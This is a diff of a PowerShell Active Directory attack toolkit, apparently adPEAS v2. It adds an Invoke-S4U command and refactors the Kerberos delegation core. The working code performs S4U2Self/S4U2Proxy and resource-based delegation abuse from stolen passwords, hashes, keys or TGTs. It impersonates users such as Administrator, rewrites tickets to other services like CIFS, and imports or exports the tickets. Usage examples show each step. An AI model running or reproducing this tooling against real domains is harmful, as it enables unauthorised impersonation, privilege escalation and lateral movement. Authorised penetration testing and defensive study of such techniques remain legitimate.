-                -ImpersonateUser $ImpersonateUser
+                if ($UseRBCD) {
+                    $s4u2proxyParams['ResourceBased'] = $true
+                    Write-Log "[Invoke-S4UCore] Using RBCD mode (PA-PAC-OPTIONS flag)"
+                }
 
-            if (-not $s4u2selfResult -or -not $s4u2selfResult.Success) {
-                $errMsg = if ($s4u2selfResult) { $s4u2selfResult.Message } else { "No result returned" }
-                throw "S4U2Self failed: $errMsg"
+                $s4u2proxyResult = Request-ServiceTicket @s4u2proxyParams
+
+                if (-not $s4u2proxyResult -or -not $s4u2proxyResult.Success) {
+                    $errMsg = if ($s4u2proxyResult) { $s4u2proxyResult.Message } else { "No result returned" }
+                    throw "S4U2Proxy failed: $errMsg"
+                }
+
+                Write-Log "[Invoke-S4UCore] S4U2Proxy succeeded (etype: $($s4u2proxyResult.EncryptionType))"
+                $finalTicket = $s4u2proxyResult
+                $finalPrincipal = $TargetSPN
+            }
+            else {
+                Write-Log "[Invoke-S4UCore] Step 3: Skipped - S4U2Self alone"
+                $finalTicket = $s4u2selfResult
+                $finalPrincipal = $ServiceAccount
             }
 
-            Write-Log "[Invoke-S4UCore] S4U2Self succeeded (etype: $($s4u2selfResult.EncryptionType))"
+            # The KRB-CRED of the ticket as issued (needed for PTT and -OutputKirbi).
+            # ConvertTo-S4UKrbCred passes the raw .SessionKeyBytes - not the Base64
+            # display string .SessionKey, which Build-KRBCred's [byte[]] -SessionKey
+            # rejects - and labels the key with its own type, not the ticket etype.
+            $baseKrbCred = ConvertTo-S4UKrbCred -ServiceTicket $finalTicket -Realm $Domain `
+                -ClientName $ImpersonateUser -ServerPrincipal $finalPrincipal
 
-            # Step 3: S4U2Proxy - Constrained Delegation
-            Write-Log "[Invoke-S4UCore] Step 3: S4U2Proxy - forwarding ticket to '$TargetSPN'"
-
-            $s4u2proxyParams = @{
-                TGT                  = $tgtResult.TicketBytes
-                SessionKey           = $tgtResult.SessionKeyBytes
-                SessionKeyType       = $tgtResult.EncryptionType
-                ServicePrincipalName = $TargetSPN
-                Domain               = $Domain
-                DomainController     = $tgtServer
-                UserName             = $ServiceAccount
-                S4U2Proxy            = $true
-                AdditionalTicket     = $s4u2selfResult.TicketBytes
-                ImpersonateUser      = $ImpersonateUser
-            }
-
-            if ($UseRBCD) {
-                $s4u2proxyParams['ResourceBased'] = $true
-                Write-Log "[Invoke-S4UCore] Using RBCD mode (PA-PAC-OPTIONS flag)"
-            }
-
-            $s4u2proxyResult = Request-ServiceTicket @s4u2proxyParams
-
-            if (-not $s4u2proxyResult -or -not $s4u2proxyResult.Success) {
-                $errMsg = if ($s4u2proxyResult) { $s4u2proxyResult.Message } else { "No result returned" }
-                throw "S4U2Proxy failed: $errMsg"
-            }
-
-            Write-Log "[Invoke-S4UCore] S4U2Proxy succeeded (etype: $($s4u2proxyResult.EncryptionType))"
-
-            # Extract target host from SPN for AlternateService
-            $spnParts = $TargetSPN -split '/', 2
-            $originalService = if ($spnParts.Count -ge 2) { $spnParts[0] } else { "" }
-            $targetHost = if ($spnParts.Count -ge 2) { $spnParts[1] } else { $TargetSPN }
-
-            # Build base KRB-CRED for original ticket (needed for PTT and AlternateService)
-            #
-            # .SessionKeyBytes, not .SessionKey - Request-ServiceTicket returns the session
-            # key both ways, as a Base64 display string (.SessionKey) and as the raw bytes
-            # (.SessionKeyBytes). Build-KRBCred's -SessionKey is typed [byte[]] and rejects
-            # a string outright ("Cannot convert value ... to type System.Byte[]"), so this
-            # threw on every successful S4U2Proxy exchange - the Kerberos exchange itself
-            # had already succeeded, and the tool reported the whole attack as failed.
-            $baseKrbCredParams = @{
-                Ticket         = $s4u2proxyResult.TicketBytes
-                SessionKey     = $s4u2proxyResult.SessionKeyBytes
-                SessionKeyType = $s4u2proxyResult.EncryptionType
-                Realm          = $Domain.ToUpper()
-                ClientName     = $ImpersonateUser
-                ServerName     = $TargetSPN
-            }
-
-            $baseKrbCred = Build-KRBCred @baseKrbCredParams
-
-            # Step 4: AlternateService Substitution (optional)
+            # Step 4: Service-name substitution (optional)
             $alternateTickets = $null
             $altSPNList = $null
             $pttMessage = ""
 
-            if ($AlternateService -and $AlternateService.Count -gt 0) {
-                Write-Log "[Invoke-S4UCore] Step 4: Applying SPN substitution for $($AlternateService.Count) alternate service(s)"
+            if ($altSPNs.Count -gt 0) {
+                Write-Log "[Invoke-S4UCore] Step 4: Applying SPN substitution for $($altSPNs.Count) alternate service(s)"
 
                 $alternateTickets = @()
 
-                foreach ($altSvc in $AlternateService) {
-                    $newSPN = "$altSvc/$targetHost"
-                    Write-Log "[Invoke-S4UCore] Substituting: $TargetSPN -> $newSPN"
+                foreach ($newSPN in $altSPNs) {
+                    Write-Log "[Invoke-S4UCore] Substituting: $finalPrincipal -> $newSPN"
 
                     try {
-                        # Build KRB-CRED with substituted ServerName
-                        $altKrbCredParams = @{
-                            Ticket         = $s4u2proxyResult.TicketBytes
-                            SessionKey     = $s4u2proxyResult.SessionKeyBytes
-                            SessionKeyType = $s4u2proxyResult.EncryptionType
-                            Realm          = $Domain.ToUpper()
-                            ClientName     = $ImpersonateUser
-                            ServerName     = $newSPN
-                        }
-
-                        $altKrbCred = Build-KRBCred @altKrbCredParams
+                        $altKrbCred = ConvertTo-S4UKrbCred -ServiceTicket $finalTicket -Realm $Domain `
+                            -ClientName $ImpersonateUser -ServerPrincipal $newSPN -RewriteTicket
 
                         $altTicketObj = [PSCustomObject]@{
                             SPN         = $newSPN
@@ -82262,14 +82568,14 @@ function Invoke-S4UCore {
 
                 $importedCount = @($alternateTickets | Where-Object { $_.Imported }).Count
                 if (-not $PTT) {
-                    $pttMessage = " ($($AlternateService.Count) alternate ticket(s) - use -PTT to import)"
-                } elseif ($importedCount -eq $AlternateService.Count) {
+                    $pttMessage = " ($($altSPNs.Count) alternate ticket(s) - use -PTT to import)"
+                } elseif ($importedCount -eq $altSPNs.Count) {
                     $pttMessage = " ($importedCount alternate ticket(s) imported)"
                 } else {
-                    $pttMessage = " ($importedCount/$($AlternateService.Count) alternate ticket(s) imported)"
+                    $pttMessage = " ($importedCount/$($altSPNs.Count) alternate ticket(s) imported)"
                 }
 
-                $altSPNList = ($AlternateService | ForEach-Object { "$_/$targetHost" }) -join ', '
+                $altSPNList = $altSPNs -join ', '
             }
             else {
                 # No AlternateService - standard PTT for original ticket
@@ -82290,7 +82596,10 @@ function Invoke-S4UCore {
                 }
             }
 
-            # Step 5: Export .kirbi (optional)
+            # Step 5: Export .kirbi (optional) - the ticket as issued, and next to it every
+            # substituted one: with S4U2Self alone the ticket as issued names the service
+            # account itself, so the substituted ticket is usually the one wanted.
+            $altKirbiFiles = @()
             if ($OutputKirbi) {
                 # Resolve PSPath to filesystem path: [IO.File]::WriteAllBytes uses
                 # Environment.CurrentDirectory, not PowerShell's $PWD.
@@ -82304,10 +82613,29 @@ function Invoke-S4UCore {
                 catch {
                     Write-Warning "[!] Failed to export .kirbi: $($_.Exception.Message)"
                 }
+
+                foreach ($altTicket in @($alternateTickets)) {
+                    if (-not $altTicket) { continue }
+                    $safeName = $altTicket.SPN -replace '[\\/:*?"<>|]', '_'
+                    $altPath = [System.IO.Path]::Combine(
+                        [System.IO.Path]::GetDirectoryName($outputPath),
+                        ([System.IO.Path]::GetFileNameWithoutExtension($outputPath) + '_' + $safeName + '.kirbi'))
+                    try {
+                        [System.IO.File]::WriteAllBytes($altPath, [byte[]]$altTicket.TicketBytes)
+                        $altKirbiFiles += $altPath
+                        Write-Log "[Invoke-S4UCore] Alternate ticket exported: $altPath"
+                    }
+                    catch {
+                        Write-Warning "[!] Failed to export .kirbi for $($altTicket.SPN): $($_.Exception.Message)"
+                    }
+                }
             }
 
             # Build Result Object
-            $delegationType = if ($UseRBCD) { "RBCD" } else { "Classic Constrained Delegation" }
+            $delegationType = "Classic Constrained Delegation"
+            if (-not $TargetSPN) { $delegationType = "S4U2Self" }
+            elseif ($UseRBCD) { $delegationType = "RBCD" }
+            elseif ($EvidenceTicket) { $delegationType = "Constrained Delegation (evidence ticket)" }
 
             $result = [PSCustomObject]@{
                 PSTypeName          = 'adPEAS.S4U.Result'
@@ -82316,10 +82644,11 @@ function Invoke-S4UCore {
                 ServiceAccount      = $ServiceAccount
                 ImpersonateUser     = $ImpersonateUser
                 TargetSPN           = $TargetSPN
+                TicketFor           = $finalPrincipal
                 Domain              = $Domain
                 DomainController    = $tgtServer
                 TicketBytes         = $baseKrbCred
-                Imported            = ($PTT -and -not $AlternateService)
+                Imported            = ($PTT -and $altSPNs.Count -eq 0)
                 Message             = "S4U attack successful$pttMessage"
             }
 
@@ -82333,6 +82662,9 @@ function Invoke-S4UCore {
             # Add OutputKirbi path if used
             if ($OutputKirbi) {
                 $result | Add-Member -NotePropertyName 'KirbiFile' -NotePropertyValue $OutputKirbi
+                if ($altKirbiFiles.Count -gt 0) {
+                    $result | Add-Member -NotePropertyName 'AlternateKirbiFiles' -NotePropertyValue $altKirbiFiles
+                }
             }
 
             return $result
@@ -82875,9 +83207,553 @@ function Invoke-RBCD {
     }
 }
 
+function Invoke-S4U {
+    <#
+    .SYNOPSIS
+        S4U2Self and S4U2Proxy for a service account, from its secret or from its TGT.
+
+    .DESCRIPTION
+        The general S4U command. Invoke-ConstrainedDelegation and Invoke-RBCD cover the two
+        common cases; this one also covers:
+
+        - S4U2Self alone (no -TargetSPN). The KDC issues a ticket for the impersonated user
+          to the service account itself. It is encrypted with that account's key, so with
+          -AlternateService it becomes a ticket to any service of the account - for a
+          computer account, e.g. cifs/<host> as an administrator of that host.
+        - A TGT instead of a secret (-Ticket): a .kirbi or ccache of the service account's
+          TGT, as a file path or Base64, e.g. from Rubeus, Mimikatz or Impacket. The
+          account, and the domain unless -Domain is given, are read from the ticket.
+        - An evidence ticket instead of S4U2Self (-EvidenceTicket): constrained delegation
+          without protocol transition. The KDC then issues an S4U2Self ticket that is not
+          forwardable, and S4U2Proxy refuses it; a forwardable service ticket for the user
+          to the service account, obtained another way, serves as the additional ticket.
+        - -ResourceBased for resource-based constrained delegation (PA-PAC-OPTIONS).
+
+        Prerequisites, as for the other two: S4U2Proxy needs msDS-AllowedToDelegateTo on the
+        service account to contain -TargetSPN (classic), or the target account's
+        msDS-AllowedToActOnBehalfOfOtherIdentity to name the service account
+        (-ResourceBased). S4U2Self alone needs an account with an SPN or a computer account.
+
+        Failure Cases:
+        - KDC_ERR_BADOPTION (13): the forwarded ticket is not forwardable - protocol
+          transition is not allowed (use -EvidenceTicket), the user is sensitive or in
+          Protected Users, or -ResourceBased is missing for RBCD
+        - KRB_AP_ERR_BADMATCH (36): -TargetSPN is not in msDS-AllowedToDelegateTo
+        - KDC_ERR_S_PRINCIPAL_UNKNOWN (7): the service account has no SPN (S4U2Self)
+
+    .PARAMETER ServiceAccount
+        sAMAccountName of the service account (with a secret below).
+
+    .PARAMETER ServicePassword
+        Plain-text password of the service account.
+
+    .PARAMETER ServiceCredential
+        PSCredential of the service account.
+
+    .PARAMETER ServiceNTHash
+        NT hash of the service account (Overpass-the-Hash).
+
+    .PARAMETER ServiceAES256Key
+        AES256 key of the service account (Pass-the-Key).
+
+    .PARAMETER ServiceAES128Key
+        AES128 key of the service account (Pass-the-Key).
+
+    .PARAMETER Ticket
+        The service account's TGT: a .kirbi (KRB-CRED) or ccache, as a file path or as
+        Base64. Replaces -ServiceAccount and the secret.
+
+    .PARAMETER ImpersonateUser
+        User to impersonate (sAMAccountName). With -EvidenceTicket it defaults to the
+        client of that ticket.
+
+    .PARAMETER TargetSPN
+        Service to reach through S4U2Proxy (e.g. "cifs/fs01.contoso.com"). Without it only
+        S4U2Self is performed.
+
+    .PARAMETER EvidenceTicket
+        A service ticket for the impersonated user to the service account (.kirbi or
+        ccache, file path or Base64), used instead of S4U2Self. Needs -TargetSPN.
+
+    .PARAMETER ResourceBased
+        Request S4U2Proxy as resource-based constrained delegation. Needs -TargetSPN.
+
+    .PARAMETER Domain
+        Domain FQDN. Defaults to the realm of -Ticket, then to the domain of the session.
+
+    .PARAMETER Server
+        Domain Controller (KDC). Defaults to the session's DC, then to DNS discovery.
+
+    .PARAMETER PTT
+        Import the resulting ticket(s) via Pass-the-Ticket.
+
+    .PARAMETER OutputKirbi
+        Export the ticket to a .kirbi file; substituted tickets are written next to it.
+
+    .PARAMETER AlternateService
+        Service names to substitute in the final ticket: a service class ("cifs", combined
+        with the host of -TargetSPN) or a full SPN ("cifs/web01.contoso.com", required
+        without -TargetSPN).
+
+    .EXAMPLE
+        Invoke-S4U -Ticket .\web01.kirbi -ImpersonateUser Administrator -AlternateService cifs/web01.contoso.com -PTT
+
+        S4U2Self alone from the TGT of the computer account WEB01$, turned into a CIFS
+        ticket to WEB01 as Administrator and imported.
+
+    .EXAMPLE
+        Invoke-S4U -ServiceAccount websvc -ServiceAES256Key "4a3b2c1d..." -ImpersonateUser Administrator -TargetSPN cifs/fs01.contoso.com -Domain contoso.com -PTT
+
+        Classic constrained delegation with protocol transition (as Invoke-ConstrainedDelegation).
+
+    .EXAMPLE
+        Invoke-S4U -ServiceAccount websvc -ServicePassword "P@ssw0rd" -EvidenceTicket .\admin-to-websvc.kirbi -TargetSPN cifs/fs01.contoso.com -Domain contoso.com -PTT
+
+        Constrained delegation without protocol transition: the forwardable ticket for
+        Administrator to websvc replaces S4U2Self.
+
+    .EXAMPLE
+        Invoke-S4U -Ticket "doIF..." -ImpersonateUser Administrator -TargetSPN cifs/fs01.contoso.com -ResourceBased -OutputKirbi .\admin-fs01.kirbi
+
+        Resource-based constrained delegation from a Base64 TGT, ticket exported.
+
+    .OUTPUTS
+        PSCustomObject (adPEAS.S4U.Result): Success, DelegationType, ServiceAccount,
+        ImpersonateUser, TargetSPN, TicketFor, TicketBytes (KRB-CRED), Message, and the
+        alternate tickets when -AlternateService was used.
+
+    .NOTES
+        Author: Alexander Sturz
+        Part of adPEAS v2
+    #>
+    [CmdletBinding(DefaultParameterSetName='Password')]
+    param(
+        # Service account and its secret
+        [Parameter(Mandatory=$true, ParameterSetName='Password')]
+        [Parameter(Mandatory=$true, ParameterSetName='Credential')]
+        [Parameter(Mandatory=$true, ParameterSetName='NTHash')]
+        [Parameter(Mandatory=$true, ParameterSetName='AES256')]
+        [Parameter(Mandatory=$true, ParameterSetName='AES128')]
+        [string]$ServiceAccount,
+
+        [Parameter(Mandatory=$true, ParameterSetName='Password')]
+        [string]$ServicePassword,
+
+        [Parameter(Mandatory=$true, ParameterSetName='Credential')]
+        [System.Management.Automation.PSCredential]$ServiceCredential,
+
+        [Parameter(Mandatory=$true, ParameterSetName='NTHash')]
+        [string]$ServiceNTHash,
+
+        [Parameter(Mandatory=$true, ParameterSetName='AES256')]
+        [string]$ServiceAES256Key,
+
+        [Parameter(Mandatory=$true, ParameterSetName='AES128')]
+        [string]$ServiceAES128Key,
+
+        # ... or the service account's TGT
+        [Parameter(Mandatory=$true, ParameterSetName='Ticket')]
+        [string]$Ticket,
+
+        # Common
+        [Parameter(Mandatory=$false)]
+        [string]$ImpersonateUser,
+
+        [Parameter(Mandatory=$false)]
+        [string]$TargetSPN,
+
+        [Parameter(Mandatory=$false)]
+        [string]$EvidenceTicket,
+
+        [Parameter(Mandatory=$false)]
+        [switch]$ResourceBased,
+
+        [Parameter(Mandatory=$false)]
+        [string]$Domain,
+
+        [Parameter(Mandatory=$false)]
+        [string]$Server,
+
+        [Parameter(Mandatory=$false)]
+        [switch]$PTT,
+
+        [Parameter(Mandatory=$false)]
+        [string]$OutputKirbi,
+
+        [Parameter(Mandatory=$false)]
+        [string[]]$AlternateService
+    )
+
+    begin {
+        Write-Verbose "[Invoke-S4U] Starting S4U (parameter set: $($PSCmdlet.ParameterSetName))"
+    }
+
+    process {
+        try {
+            $coreParams = @{}
+
+            # The service account's TGT
+            if ($PSCmdlet.ParameterSetName -eq 'Ticket') {
+                $tgt = Read-S4UTicketInput -InputValue $Ticket -ParameterName 'Ticket'
+                if ($tgt.ServerName -notmatch '^krbtgt(/|$)') {
+                    throw "-Ticket must hold a TGT (krbtgt/<REALM>) of the service account; it holds a ticket for '$($tgt.ServerName)'"
+                }
+                if (-not $tgt.ClientName) {
+                    throw "-Ticket does not name its client - the service account cannot be determined"
+                }
+                $ServiceAccount = $tgt.ClientName
+                if (-not $Domain -and $tgt.ClientRealm) { $Domain = $tgt.ClientRealm.ToLower() }
+
+                $coreParams['TGTTicket'] = $tgt.Ticket
+                $coreParams['TGTSessionKey'] = $tgt.SessionKey
+                $coreParams['TGTSessionKeyType'] = $tgt.SessionKeyType
+                Write-Verbose "[Invoke-S4U] TGT of '$ServiceAccount' loaded ($($tgt.Format), session key etype $($tgt.SessionKeyType))"
+            }
+            else {
+                if ($ServicePassword) { $coreParams['ServicePassword'] = $ServicePassword }
+                if ($ServiceCredential) { $coreParams['ServiceCredential'] = $ServiceCredential }
+                if ($ServiceNTHash) { $coreParams['ServiceNTHash'] = $ServiceNTHash }
+                if ($ServiceAES256Key) { $coreParams['ServiceAES256Key'] = $ServiceAES256Key }
+                if ($ServiceAES128Key) { $coreParams['ServiceAES128Key'] = $ServiceAES128Key }
+            }
+
+            # The evidence ticket - its client is the user the result is issued for
+            if ($EvidenceTicket) {
+                $evidence = Read-S4UTicketInput -InputValue $EvidenceTicket -ParameterName 'EvidenceTicket'
+                if ($evidence.ServerName -match '^krbtgt(/|$)') {
+                    throw "-EvidenceTicket must be a service ticket for the user to the service account, not a TGT"
+                }
+                if ($evidence.ClientName) {
+                    if ($ImpersonateUser -and $ImpersonateUser -ne $evidence.ClientName) {
+                        Write-Warning "[!] -ImpersonateUser '$ImpersonateUser' differs from the client of the evidence ticket ('$($evidence.ClientName)') - the KDC issues the ticket for the latter, so that is the user used"
+                    }
+                    $ImpersonateUser = $evidence.ClientName
+                }
+                $coreParams['EvidenceTicket'] = $evidence.Ticket
+            }
+
+            if (-not $Domain) {
+                if ($Script:LDAPContext -and $Script:LDAPContext.ContainsKey('Domain') -and $Script:LDAPContext['Domain']) {
+                    $Domain = $Script:LDAPContext['Domain']
+                } else {
+                    throw "-Domain is required: no -Ticket realm and no session to take it from"
+                }
+            }
+            if (-not $ImpersonateUser) {
+                throw "-ImpersonateUser is required (unless -EvidenceTicket names the user)"
+            }
+            if (-not $TargetSPN -and ($EvidenceTicket -or $ResourceBased)) {
+                throw "-EvidenceTicket and -ResourceBased only apply to S4U2Proxy - specify -TargetSPN"
+            }
+
+            $coreParams['ServiceAccount'] = $ServiceAccount
+            $coreParams['ImpersonateUser'] = $ImpersonateUser
+            $coreParams['Domain'] = $Domain
+            if ($TargetSPN) { $coreParams['TargetSPN'] = $TargetSPN }
+            if ($Server) { $coreParams['Server'] = $Server }
+            if ($ResourceBased) { $coreParams['UseRBCD'] = $true }
+            if ($PTT) { $coreParams['PTT'] = $true }
+            if ($OutputKirbi) { $coreParams['OutputKirbi'] = $OutputKirbi }
+            if ($AlternateService) { $coreParams['AlternateService'] = $AlternateService }
+
+            return Invoke-S4UCore @coreParams
+        }
+        catch {
+            Write-Verbose "[Invoke-S4U] S4U failed: $($_.Exception.Message)"
+
+            return [PSCustomObject]@{
+                PSTypeName      = 'adPEAS.S4U.Result'
+                Success         = $false
+                ServiceAccount  = $ServiceAccount
+                ImpersonateUser = $ImpersonateUser
+                TargetSPN       = $TargetSPN
+                Domain          = $Domain
+                Message         = "S4U attack failed"
+                Error           = $_.Exception.Message
+            }
+        }
+    }
+}
+
 
 
 # ----- Import-KerberosTicket.ps1 -----
+
+function ConvertFrom-CcacheBytes {
+    <#
+    .SYNOPSIS
+        Parses MIT Kerberos ccache data and returns its TGT credential.
+
+    .DESCRIPTION
+        Returns the TGT (krbtgt/...) credential of the cache, or the first credential when
+        the cache holds no TGT: the raw Ticket bytes, the session key and its type, the
+        client and server principal with their realms, and the ticket times.
+
+        Shared by Import-KerberosTicket (-Ccache, for pass-the-ticket) and Invoke-S4U
+        (-Ticket / -EvidenceTicket, which need the ticket and its session key rather than
+        an import into the logon session). It lived inside Import-KerberosTicket's begin
+        block until Invoke-S4U needed it, so it is top-level now; the logic is unchanged.
+
+    .DESCRIPTION
+        Ccache file format (MIT Kerberos):
+        - Header: version (2 bytes), principal, time offset
+        - Credentials: list of credential entries
+        - Each credential: client, server, keyblock, times, ticket, authdata
+
+    .PARAMETER Bytes
+        The ccache file content (format version 1 to 4).
+
+    .OUTPUTS
+        Hashtable: Ticket, SessionKey, SessionKeyType, ClientName, ClientRealm, ServerName,
+        ServerRealm, AuthTime, StartTime, EndTime, RenewTill.
+
+    .NOTES
+        File format reference: https://web.mit.edu/kerberos/krb5-devel/doc/formats/ccache_file_format.html
+    #>
+    [CmdletBinding()]
+    param(
+        [Parameter(Mandatory = $true)]
+        [byte[]]$Bytes
+    )
+
+    $bytes = $Bytes
+    $offset = 0
+
+    # Helper functions for reading big-endian values
+    function Read-UInt16BE {
+        param([int]$pos)
+        # Bounds check: need 2 bytes
+        if ($pos + 2 -gt $bytes.Length) {
+            throw "ccache: Read-UInt16BE out of bounds at position $pos"
+        }
+        return ([uint16]$bytes[$pos] -shl 8) -bor $bytes[$pos + 1]
+    }
+
+    function Read-UInt32BE {
+        param([int]$pos)
+        # Bounds check: need 4 bytes
+        if ($pos + 4 -gt $bytes.Length) {
+            throw "ccache: Read-UInt32BE out of bounds at position $pos"
+        }
+        return ([uint32]$bytes[$pos] -shl 24) -bor `
+               ([uint32]$bytes[$pos + 1] -shl 16) -bor `
+               ([uint32]$bytes[$pos + 2] -shl 8) -bor `
+               $bytes[$pos + 3]
+    }
+
+    function Read-Data {
+        param([int]$pos)
+        # Read length (with bounds check from Read-UInt32BE)
+        $len = Read-UInt32BE -pos $pos
+        # Bounds check: ensure data doesn't extend beyond buffer
+        if ($pos + 4 + $len -gt $bytes.Length) {
+            throw "ccache: Read-Data length $len extends beyond data at position $pos"
+        }
+        $data = if ($len -gt 0) { $bytes[($pos + 4)..($pos + 3 + $len)] } else { @() }
+        return @{
+            Length = $len
+            Data = $data
+            NextPos = $pos + 4 + $len
+        }
+    }
+
+    function Read-Principal {
+        param([int]$pos, [int]$version)
+        $result = @{
+            NameType = 0
+            Components = @()
+            Realm = ""
+            NextPos = $pos
+        }
+
+        # Name type (4 bytes)
+        $result.NameType = Read-UInt32BE -pos $pos
+        $pos += 4
+
+        # Component count (4 bytes)
+        $compCount = Read-UInt32BE -pos $pos
+        $pos += 4
+
+        # Realm (only in version 4+, in version 3 it's after components)
+        if ($version -ge 4) {
+            $realmData = Read-Data -pos $pos
+            $result.Realm = [System.Text.Encoding]::ASCII.GetString($realmData.Data)
+            $pos = $realmData.NextPos
+        }
+
+        # Components
+        for ($i = 0; $i -lt $compCount; $i++) {
+            $compData = Read-Data -pos $pos
+            $result.Components += [System.Text.Encoding]::ASCII.GetString($compData.Data)
+            $pos = $compData.NextPos
+        }
+
+        # In version 3, realm comes after components
+        if ($version -lt 4) {
+            $realmData = Read-Data -pos $pos
+            $result.Realm = [System.Text.Encoding]::ASCII.GetString($realmData.Data)
+            $pos = $realmData.NextPos
+        }
+
+        $result.NextPos = $pos
+        return $result
+    }
+
+    # Parse header
+    $version = Read-UInt16BE -pos 0
+    $offset = 2
+    Write-Log "[ConvertFrom-CcacheBytes] Ccache version: $version (0x$($version.ToString('X4')))"
+
+    # Normalize version number (0x0504 = version 4, 0x0503 = version 3, etc.)
+    $versionNum = $version -band 0x00FF
+
+    # Only support ccache version 3 and 4 (modern MIT Kerberos)
+    # Version 1/2 have different structure (pre-2000 MIT Kerberos) and are extremely rare
+    if ($versionNum -lt 3 -or $versionNum -gt 4) {
+        if ($versionNum -eq 1 -or $versionNum -eq 2) {
+            throw "Ccache version $versionNum is not supported (legacy MIT Kerberos format from pre-2000). Please use a modern tool like 'kcc' or 'ticketConverter.py' to convert to version 4 format."
+        }
+        throw "Unsupported ccache version: $versionNum (0x$($version.ToString('X4'))). Only version 3 and 4 are supported."
+    }
+
+    Write-Log "[ConvertFrom-CcacheBytes] Ccache format version: $versionNum"
+
+    # Skip header tags (version 4 only)
+    if ($versionNum -eq 4) {
+        $headerLen = Read-UInt16BE -pos $offset
+        $offset += 2 + $headerLen
+        Write-Log "[ConvertFrom-CcacheBytes] Skipped $headerLen bytes of v4 header tags"
+    }
+
+    # Read default principal
+    $defaultPrinc = Read-Principal -pos $offset -version $versionNum
+    $offset = $defaultPrinc.NextPos
+    Write-Log "[ConvertFrom-CcacheBytes] Default principal: $($defaultPrinc.Components -join '/') @ $($defaultPrinc.Realm)"
+
+    # Parse credentials until end of file
+    $credentials = @()
+    while ($offset -lt $bytes.Length) {
+        try {
+            $cred = @{}
+
+            # Client principal
+            $client = Read-Principal -pos $offset -version $versionNum
+            $cred.ClientRealm = $client.Realm
+            $cred.ClientName = $client.Components -join '/'
+            $offset = $client.NextPos
+
+            # Server principal
+            $server = Read-Principal -pos $offset -version $versionNum
+            $cred.ServerRealm = $server.Realm
+            $cred.ServerName = $server.Components -join '/'
+            $offset = $server.NextPos
+
+            # Keyblock
+            $keyType = Read-UInt16BE -pos $offset
+            $offset += 2
+            if ($versionNum -eq 3) {
+                $offset += 2  # padding in v3
+            }
+            $keyData = Read-Data -pos $offset
+            $cred.KeyType = $keyType
+            $cred.SessionKey = $keyData.Data
+            $offset = $keyData.NextPos
+
+            # Times (4x uint32)
+            $cred.AuthTime = Read-UInt32BE -pos $offset
+            $offset += 4
+            $cred.StartTime = Read-UInt32BE -pos $offset
+            $offset += 4
+            $cred.EndTime = Read-UInt32BE -pos $offset
+            $offset += 4
+            $cred.RenewTill = Read-UInt32BE -pos $offset
+            $offset += 4
+
+            # is_skey (1 byte)
+            $offset += 1
+
+            # Ticket flags (4 bytes)
+            $cred.TicketFlags = Read-UInt32BE -pos $offset
+            $offset += 4
+
+            # Addresses (count + data)
+            $addrCount = Read-UInt32BE -pos $offset
+            $offset += 4
+            for ($i = 0; $i -lt $addrCount; $i++) {
+                $null = Read-UInt16BE -pos $offset  # addrType - skip
+                $offset += 2
+                $addrData = Read-Data -pos $offset
+                $offset = $addrData.NextPos
+            }
+
+            # Authdata (count + data)
+            $authCount = Read-UInt32BE -pos $offset
+            $offset += 4
+            for ($i = 0; $i -lt $authCount; $i++) {
+                $null = Read-UInt16BE -pos $offset  # authType - skip
+                $offset += 2
+                $authData = Read-Data -pos $offset
+                $offset = $authData.NextPos
+            }
+
+            # Ticket
+            $ticketData = Read-Data -pos $offset
+            $cred.Ticket = $ticketData.Data
+            $offset = $ticketData.NextPos
+
+            # Second ticket (for TGS requests)
+            $secondTicketData = Read-Data -pos $offset
+            $offset = $secondTicketData.NextPos
+
+            Write-Log "[ConvertFrom-CcacheBytes] Found credential: $($cred.ServerName) @ $($cred.ServerRealm)"
+            $credentials += $cred
+        }
+        catch {
+            Write-Log "[ConvertFrom-CcacheBytes] Error parsing credential at offset $offset : $_"
+            break
+        }
+    }
+
+    if ($credentials.Count -eq 0) {
+        throw "No credentials found in ccache file"
+    }
+
+    # Find TGT (krbtgt/REALM@REALM)
+    $tgt = $credentials | Where-Object { $_.ServerName -match '^krbtgt/' } | Select-Object -First 1
+
+    if (-not $tgt) {
+        # Fall back to first credential
+        Write-Log "[ConvertFrom-CcacheBytes] No TGT found, using first credential"
+        $tgt = $credentials[0]
+    }
+
+    Write-Log "[ConvertFrom-CcacheBytes] Selected credential: $($tgt.ServerName) @ $($tgt.ServerRealm)"
+    Write-Log "[ConvertFrom-CcacheBytes] Session key type: $($tgt.KeyType), length: $($tgt.SessionKey.Length)"
+    Write-Log "[ConvertFrom-CcacheBytes] Ticket size: $($tgt.Ticket.Length) bytes"
+
+    # Convert Unix timestamps to DateTime (ccache stores times as Unix epoch)
+    $unixEpoch = [DateTime]::new(1970, 1, 1, 0, 0, 0, [DateTimeKind]::Utc)
+    $AuthTime = if ($tgt.AuthTime -gt 0) { $unixEpoch.AddSeconds($tgt.AuthTime) } else { $null }
+    $StartTime = if ($tgt.StartTime -gt 0) { $unixEpoch.AddSeconds($tgt.StartTime) } else { $null }
+    $EndTime = if ($tgt.EndTime -gt 0) { $unixEpoch.AddSeconds($tgt.EndTime) } else { $null }
+    $RenewTill = if ($tgt.RenewTill -gt 0) { $unixEpoch.AddSeconds($tgt.RenewTill) } else { $null }
+
+    Write-Log "[ConvertFrom-CcacheBytes] Ticket times: Auth=$AuthTime, Start=$StartTime, End=$EndTime, Renew=$RenewTill"
+
+    return @{
+        Ticket = $tgt.Ticket
+        SessionKey = $tgt.SessionKey
+        SessionKeyType = $tgt.KeyType
+        ClientName = $tgt.ClientName
+        ClientRealm = $tgt.ClientRealm
+        ServerName = $tgt.ServerName
+        ServerRealm = $tgt.ServerRealm
+        AuthTime = $AuthTime
+        StartTime = $StartTime
+        EndTime = $EndTime
+        RenewTill = $RenewTill
+    }
+}
 
 function Import-KerberosTicket {
 <#
@@ -83016,264 +83892,8 @@ function Import-KerberosTicket {
         # - Build-KRBCred (for building KRB-CRED structures)
 
         #region Ccache Parser
-
-        function Parse-CcacheBytes {
-            <#
-            .SYNOPSIS
-                Parses MIT Kerberos ccache data and extracts the first TGT as KRB-CRED.
-
-            .DESCRIPTION
-                Ccache file format (MIT Kerberos):
-                - Header: version (2 bytes), principal, time offset
-                - Credentials: list of credential entries
-                - Each credential: client, server, keyblock, times, ticket, authdata
-
-            .NOTES
-                File format reference: https://web.mit.edu/kerberos/krb5-devel/doc/formats/ccache_file_format.html
-            #>
-            param(
-                [byte[]]$Bytes
-            )
-
-            $bytes = $Bytes
-            $offset = 0
-
-            # Helper functions for reading big-endian values
-            function Read-UInt16BE {
-                param([int]$pos)
-                # Bounds check: need 2 bytes
-                if ($pos + 2 -gt $bytes.Length) {
-                    throw "ccache: Read-UInt16BE out of bounds at position $pos"
-                }
